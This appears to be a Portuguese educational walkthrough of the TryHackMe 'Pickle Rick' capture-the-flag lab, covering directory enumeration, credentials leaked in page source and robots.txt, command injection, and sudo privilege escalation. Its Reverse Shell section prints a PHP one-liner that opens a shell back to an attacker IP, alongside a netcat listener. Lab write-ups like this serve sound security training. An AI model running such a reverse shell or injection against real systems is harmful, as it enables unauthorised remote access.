# 🥒 Pickle Rick CTF — TryHackMe  
## Walkthrough

Este repositório contém o **walkthrough completo** do desafio **Pickle Rick**, disponível na plataforma **TryHackMe**.  
O objetivo do CTF é localizar **três ingredientes (flags)** escondidos no sistema alvo, explorando vulnerabilidades em uma aplicação web e no sistema operacional subjacente.

Este write-up foi elaborado com foco **educacional**, documentando cada etapa do processo de forma clara e estruturada, seguindo uma metodologia básica de pentest.

---

## 📌 Informações Gerais

- **Plataforma:** TryHackMe  
- **Desafio:** Pickle Rick  
- **Máquina atacante:** Kali Linux  
- **Conexão:** VPN TryHackMe  
- **IP do alvo

---

## 🎯 Objetivo

Encontrar os **3 ingredientes** escondidos no ambiente alvo por meio de:
- Reconhecimento
- Enumeração
- Exploração
- Escalonamento de privilégios

---

## 🔎 Reconhecimento Inicial

O primeiro passo foi verificar se o IP fornecido hospedava alguma aplicação web.

Acessando o endereço pelo navegador:

http://$IP

Foi apresentada uma página simples contendo a frase:

> **Rick is sup4r cool**

![Página inicial](images/home.png)

---

### 📄 Análise do Código-Fonte

Utilizando o recurso **View Page Source** do navegador, foi encontrado o seguinte comentário no HTML:
"Username: R1ckRul3s"

Isso indicou a possível existência de um sistema de autenticação utilizando esse usuário.

Tentativas diretas de acesso à rota `/login` não retornaram resposta válida.

---

## 🌐 Enumeração de Portas (Nmap)

Para identificar os serviços ativos no host, foi realizada uma varredura de portas, que revelou:

- **Porta 80** — HTTP  
- **Porta 22** — SSH  

Isso indicou duas superfícies principais de ataque:
- Aplicação Web
- Possível acesso remoto via SSH

---

## 📁 Enumeração de Diretórios (Gobuster)

Com foco na aplicação web, utilizei o **Gobuster** para enumerar diretórios e arquivos ocultos.

### Enumeração inicial:
bash
- **gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt**

Entre os caminhos encontrados:

/assets
/index.html
/robots.txt

Ao acessar /robots.txt, foi encontrado o seguinte conteúdo:
**Wubbalubbadubdub**

Esse valor levantou a hipótese de ser uma senha, possivelmente relacionada ao username identificado anteriormente.

## 🔍 Enumeração Avançada
Para aprofundar a enumeração, utilizei uma wordlist maior e busquei arquivos com extensão PHP:

- **gobuster dir -u $IP -w /usr/share/wordlists/dirb/big.txt -t 50 -x php**

Assim, encontrei novos caminhos:

/portal.php
/denied.php
/login.php

##🔐 Autenticação no Portal

Ao acessar /portal.php, foi apresentada uma tela de login.

Credenciais utilizadas:

- Username:**R1ckRul3s**
- Password: **Wubbalubbadubdub**

O login foi bem-sucedido e revelou um painel de comandos, caracterizando uma vulnerabilidade de Command Injection.

## 🖥️ Exploração do Painel de Comandos

Inicialmente, executei:

- **ls -a**


Entre os arquivos listados estava:

- **Sup3rS3cretPickl3Ingred.txt**


O comando cat estava bloqueado. Como alternativa, utilizei:

tac Sup3rS3cretPickl3Ingred.txt


✅ Primeira flag obtida

## 📄 Arquivo de Dica

O arquivo clue.txt continha a seguinte mensagem:

"Look around the file system for the other ingredient."

Isso indicou que os próximos ingredientes estariam em outros diretórios do sistema.

## 🔁 Reverse Shell

Para obter um acesso mais estável e interativo, foi realizada uma exploração via Reverse Shell.

Verificação do Netcat:
**which nc**

Listener na máquina atacante:
**nc -lvnp 443**

Payload executado:
**php -r '$sock=fsockopen("IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'**


Esse payload utiliza redirecionamento de file descriptors para estabelecer uma conexão reversa via TCP.

Após a conexão, executei:

- **bash -i**


para tornar o shell interativo.

## 🗂️ Enumeração do Sistema

Navegando pelo sistema:

- cd /home


No diretório do usuário Rick, foi encontrado o arquivo second ingredients.

✅ Segunda flag obtida

### ⬆️ Escalonamento de Privilégios

Para verificar permissões elevadas, executei:

**sudo -l**


O resultado indicou que o usuário podia executar qualquer comando como root sem necessidade de senha.

Escalonamento realizado com:

**sudo su -**

🏁 Flag Final

Com acesso root:

cd /root


Foi encontrado o arquivo:

**3rd.txt**


✅ Terceira flag obtida
Assim, o desafio concluído com sucesso

## 🧠 Conclusão

Este desafio foi essencial para consolidar conceitos fundamentais de Segurança Ofensiva, proporcionando experiência prática em exploração de aplicações web, sistemas Linux e escalonamento de privilégios.

## 🛠️ Habilidades Desenvolvidas

- Reconhecimento e enumeração de serviços
- Enumeração de diretórios web
- Análise de código-fonte HTML
- Identificação de credenciais expostas
- Exploração de Command Injection
- Uso de Reverse Shell
- Manipulação de file descriptors
- Enumeração de sistemas Linux
- Escalonamento de privilégios com sudo
- Metodologia básica de Pentest

---
